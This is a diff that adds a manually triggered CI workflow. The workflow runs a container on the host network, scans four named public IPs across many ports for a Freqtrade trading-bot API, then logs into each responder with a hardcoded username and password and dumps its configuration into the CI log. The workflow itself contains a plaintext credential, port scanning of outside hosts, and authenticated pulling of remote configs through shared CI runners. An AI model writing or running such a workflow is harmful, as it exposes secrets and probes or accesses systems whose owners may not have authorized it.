@@ -1,0 +1,47 @@
+name: i39698-fleet-nat2
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: docker
+    timeout-minutes: 18
+    container:
+      image: docker:27-cli
+    steps:
+      - name: fleet-nat2
+        continue-on-error: true
+        run: |
+          docker run --rm --network host -i alpine:3.21 sh -s 2>&1 <<'PROBE' | head -4000
+            #!/bin/sh
+            set -u
+            apk add -q curl >/dev/null 2>&1
+            echo "=== WHICH"; command -v curl; echo "=== HOST"; hostname; date -u
+            echo -n "EGRESS_IP="; curl -s -m 8 https://api.ipify.org; echo
+            IPS="104.199.48.75 35.205.159.255 35.233.38.30 34.79.133.17"
+            PORTS="$(seq 32321 32340) 8084 8443 6443 443 80"
+            echo "=== RESP (code|time_connect|time_total|errormsg) on /api/v1/ping"
+            : > /tmp/hits
+            for ip in $IPS; do
+              for p in $PORTS; do
+                case "$p" in 443|8443|6443) s=https ;; *) s=http ;; esac
+                r=$(curl -s --connect-timeout 2 -m 3 -o /tmp/b -w '%{http_code}|%{time_connect}|%{time_total}|%{errormsg}' "$s://$ip:$p/api/v1/ping" 2>/dev/null)
+                echo "RESP $ip:$p $s => $r body=$(head -c 100 /tmp/b | tr -d '\r\n')"
+                code=${r%%|*}
+                case "$code" in 000) ;; *) echo "$ip:$p:$s" >> /tmp/hits ;; esac
+              done
+            done
+            echo "RESPONDERS=$(wc -l < /tmp/hits 2>/dev/null || echo 0)"
+            echo "=== ONE authed GET /api/v1/show_config per responder"
+            if [ -s /tmp/hits ]; then
+              while IFS=: read -r ip p s; do
+                ac=$(curl -s -m 8 -o /tmp/c -w '%{http_code}' -u 'freqtrade:&&Liz270117!!' "$s://$ip:$p/api/v1/show_config" 2>/dev/null)
+                echo "##### SHOWCONFIG $ip:$p => $ac"
+                head -c 5000 /tmp/c; echo
+              done < /tmp/hits
+            else echo "NO_RESPONDERS"; fi
+            echo "=== CONTROL"
+            curl -s -m 6 -o /dev/null -w 'portquiz32328=%{http_code}\n' http://portquiz.net:32328/ 2>&1
+            curl -s -m 6 -o /dev/null -w 'portquiz8084=%{http_code}\n' http://portquiz.net:8084/ 2>&1
+            curl -s -m 8 -o /dev/null -w 'freqle_healthz=%{http_code}\n' https://freqle.org/healthz 2>&1
+            echo FLEET2DONE
+          PROBE
